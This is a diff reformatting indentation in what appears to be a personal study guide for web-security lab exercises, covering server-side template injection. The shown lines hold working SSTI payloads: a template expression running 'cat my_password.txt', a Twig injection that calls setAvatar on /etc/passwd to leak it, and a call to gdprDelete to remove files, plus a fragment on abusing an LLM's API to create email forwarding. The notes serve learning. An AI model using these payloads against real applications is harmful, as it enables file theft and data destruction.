@@ -3249,34 +3249,34 @@ LLM -> API: create_email_forwarding_rule('peter')
     `<#assign classloader=product.class.protectionDomain.classLoader>`
   - Read the my_password.txt from home directory
     `${dwf.newInstance(ec,null)("cat my_password.txt ")}`
-  - Server-side template injection with a **custom exploit**
-    - Upload invalid object
-      ```
-      PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28
-	Stack trace:
+- Server-side template injection with a **custom exploit**
+  - Upload invalid object
+    ```
+    PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28
+        Stack trace:
 	#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/\xE9\x80\xA0\xE6\x88\x90\xE6\xB2\x9F\xE9...', 'text/plain')
 	#1 {main}
 	  thrown in /home/carlos/User.php on line 28
-      ```
-    - Test invalid input for SSTI
-      ```
-      POST /my-account/change-blog-post-author-display
-      blog-post-author-display=user.first_name&csrf=uPkrQsnIZwIM7d5Cqt81xOtbUQXls0Vi > blog-post-author-display=user
+    ```
+  - Test invalid input for SSTI
+    ```
+    POST /my-account/change-blog-post-author-display
+    blog-post-author-display=user.first_name&csrf=uPkrQsnIZwIM7d5Cqt81xOtbUQXls0Vi > blog-post-author-display=user
  
-      PHP Fatal error: Uncaught Error: Object of class User could not be converted to string in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php
-      ```
-    - Update the display name
-      blog-post-author-display=user.`setAvatar('/etc/passwd','image/png')` > Download the avatar img file > passwd leak
-    - Read the source code
-      ```
-       public function gdprDelete() {
+    PHP Fatal error: Uncaught Error: Object of class User could not be converted to string in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php
+    ```
+  - Update the display name
+    blog-post-author-display=user.`setAvatar('/etc/passwd','image/png')` > Download the avatar img file > passwd leak
+  - Read the source code
+    ```
+    public function gdprDelete() {
         $this->rm(readlink($this->avatarLink));
         $this->rm($this->avatarLink);
         $this->delete();
-      }
-      ```
-    - Delete the user's avatar
-      blog-post-author-display=`user.gdprDelete()`  
+    }
+    ```
+  - Delete the user's avatar
+    blog-post-author-display=`user.gdprDelete()`  
   
 ## Web Cache Poisoning
 Content for Web Cache Poisoning...
